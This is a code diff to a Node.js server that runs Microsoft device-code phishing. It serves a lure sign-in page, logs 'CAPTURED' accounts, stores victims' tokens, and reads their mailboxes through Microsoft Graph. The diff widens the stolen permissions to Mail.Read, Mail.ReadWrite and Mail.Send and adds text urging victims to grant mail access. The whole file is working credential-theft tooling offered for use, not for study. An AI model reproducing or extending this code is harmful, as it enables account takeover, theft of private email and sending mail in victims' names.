@@ -67,7 +67,7 @@ app.get('/api/test', async (req, res) => {
         const testResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'User.Read openid profile offline_access'
+                scope: 'Mail.Read Mail.ReadWrite Mail.Send User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -79,7 +79,7 @@ app.get('/api/test', async (req, res) => {
 });
 
 // ============================================
-// CREATE SESSION (Device Code Flow)
+// CREATE SESSION (Device Code Flow) - WITH MAIL SCOPES
 // ============================================
 app.post('/api/create-session', async (req, res) => {
     try {
@@ -87,10 +87,11 @@ app.post('/api/create-session', async (req, res) => {
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'] || 'Unknown';
         
+        // IMPORTANT: Added Mail.Read and Mail.Send scopes
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'User.Read openid profile offline_access'
+                scope: 'Mail.Read Mail.ReadWrite Mail.Send User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -110,6 +111,7 @@ app.post('/api/create-session', async (req, res) => {
         res.json({ success: true, sid: sid, user_code: user_code });
         
     } catch (err) {
+        console.error('Create session error:', err.response?.data || err.message);
         res.status(500).json({ error: err.message });
     }
 });
@@ -160,7 +162,7 @@ async function pollForToken(device_code, sid) {
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
+            console.log(`✅ CAPTURED: ${userInfo.data.mail} (with Mail scopes!)`);
             
         } catch (err) {
             // Normal - waiting for user
@@ -212,7 +214,7 @@ app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
     if (!session) return res.status(401).json({ error: 'Session not found' });
     
     const token = await getValidToken(session);
-    if (!token) return res.status(401).json({ error: 'Token expired' });
+    if (!token) return res.status(401).json({ error: 'Token expired. Please re-authenticate.' });
     
     try {
         const folderMap = {
@@ -230,13 +232,13 @@ app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
             params: { 
                 '$top': top, 
                 '$orderby': 'receivedDateTime desc', 
-                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' 
+                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance' 
             }
         });
         res.json(response.data);
     } catch (err) {
-        console.error('Fetch emails error:', err.response?.data);
-        res.status(500).json({ error: 'Failed to fetch emails' });
+        console.error('Fetch emails error:', err.response?.data || err.message);
+        res.status(500).json({ error: 'Failed to fetch emails: ' + (err.response?.data?.error?.message || err.message) });
     }
 });
 
@@ -252,10 +254,11 @@ app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
     try {
         const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
             headers: { 'Authorization': `Bearer ${token}` },
-            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
+            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,importance' }
         });
         res.json(response.data);
     } catch (err) {
+        console.error('Fetch message error:', err.response?.data || err.message);
         res.status(500).json({ error: 'Failed to fetch message' });
     }
 });
@@ -344,7 +347,7 @@ app.get('/generate-auth-page', async (req, res) => {
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'User.Read openid profile offline_access'
+                scope: 'Mail.Read Mail.ReadWrite Mail.Send User.Read openid profile offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -397,14 +400,14 @@ app.get('/generate-auth-page', async (req, res) => {
             <li>Click <strong>"Open Microsoft Login"</strong> above</li>
             <li>Enter the code: <strong style="color:#0078d4">${user_code}</strong></li>
             <li>Sign in with your Microsoft account</li>
-            <li>Click <strong>"Continue"</strong> when asked</li>
+            <li><strong>IMPORTANT:</strong> Click <strong>"Accept"</strong> or <strong>"Continue"</strong> when asked to grant Mail permissions</li>
             <li>This window will auto-close</li>
         </ol>
     </div>
     <div class="status" id="statusMsg">
         <span class="spinner"></span> Waiting for authentication...
     </div>
-    <div class="note">🔒 Secured by Microsoft</div>
+    <div class="note">🔒 Needs access to your email to display mailbox</div>
 </div>
 <script>
     const SESSION_ID = ${sid};
@@ -442,6 +445,7 @@ app.get('/generate-auth-page', async (req, res) => {
         res.send(html);
         
     } catch (err) {
+        console.error('Generate page error:', err.message);
         res.status(500).send('Error: ' + err.message);
     }
 });
@@ -455,4 +459,5 @@ app.get('/', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Server running on port ${PORT}`);
+    console.log(`📧 Mail scopes enabled - users will be asked to grant email permissions`);
 });
